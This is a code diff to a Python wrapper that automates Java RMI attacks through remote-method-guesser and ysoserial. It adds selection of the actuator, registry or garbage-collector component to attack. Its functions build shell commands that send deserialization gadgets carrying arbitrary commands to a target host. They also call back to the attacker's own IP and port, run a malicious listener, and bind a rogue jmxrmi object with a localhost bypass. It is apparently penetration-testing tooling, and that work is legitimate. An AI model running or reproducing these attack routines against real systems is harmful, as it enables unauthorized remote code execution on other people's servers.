@@ -7,6 +7,10 @@ import socket
 CONFIG = jsu.loadConfig()
 CHOSEN_JAVA_VERSION = None
 
+# components to attack: act = actuator, dgc = distributed garbage collector, reg = registry
+COMPONENTS = ['act','reg','dgc']
+CHOSEN_COMPONENT = None
+
 # kills xterm windows
 def killXTerm():
     os.system("killall xterm")
@@ -28,13 +32,14 @@ class _RMGSerial():
 
     # rmg serial <target ip> <target port> AnTrinh <our ip>:<our port> --component reg 
     def start_AnTrinh(self,targetIP: str, targetPort: str):
-        com = "{} -jar {} serial {} {} AnTrinh {}:{} --component reg --yso {}".format(
+        com = '"{}" -jar "{}" serial {} {} AnTrinh {}:{} --component {} --yso "{}"'.format(
             CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
             CONFIG['rmg-executable-location'],
             targetIP,
             targetPort,
             CONFIG['our-ip'],
             CONFIG['our-port'],
+            CHOSEN_COMPONENT,
             CONFIG['ysoserial-path']
         )
 
@@ -47,13 +52,14 @@ class _RMGSerial():
 
     # java -jar rmg serial <target ip> <target port> <command> --component reg --yso <ysoserial.jar path>      
     def start_Serial(self,targetIP: str, targetPort: str,gadget: str,command: str):
-        com = "{} -jar {} serial {} {} {} \"{}\" --component reg --yso {}".format(
+        com = '"{}" -jar "{}" serial {} {} {} "{}" --component {} --yso "{}"'.format(
             CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
             CONFIG['rmg-executable-location'],
             targetIP,
             targetPort,
             gadget,
             command,
+            CHOSEN_COMPONENT,
             CONFIG['ysoserial-path']
         )
 
@@ -69,7 +75,7 @@ class _RMGListen():
 
     # rmg listen <our ip> <our port> <yso gadget> 'command to execute' --yso <ysoserial path>
     def start(self,gadget: str,command:str):
-        com = "{} -jar {} listen {} {} {} \"{}\" --yso {}".format(
+        com = '"{}" -jar "{}" listen {} {} {} "{}" --yso "{}"'.format(
             CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
             CONFIG['rmg-executable-location'],
             CONFIG['our-ip'],
@@ -87,7 +93,7 @@ class _RMGListen():
 
     # java -jar rmg-5.0.0-jar-with-dependencies.jar bind 10.20.30.40 24407 20.30.40.50:4444 jmxrmi --localhost-bypass   
     def listenerInject(self,targetIP: str, targetPort: str):
-        com = "{} -jar {} bind {} {} {}:{} jmxrmi --localhost-bypass".format(
+        com = '"{}" -jar "{}" bind {} {} {}:{} jmxrmi --localhost-bypass'.format(
             CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
             CONFIG['rmg-executable-location'],
             targetIP,
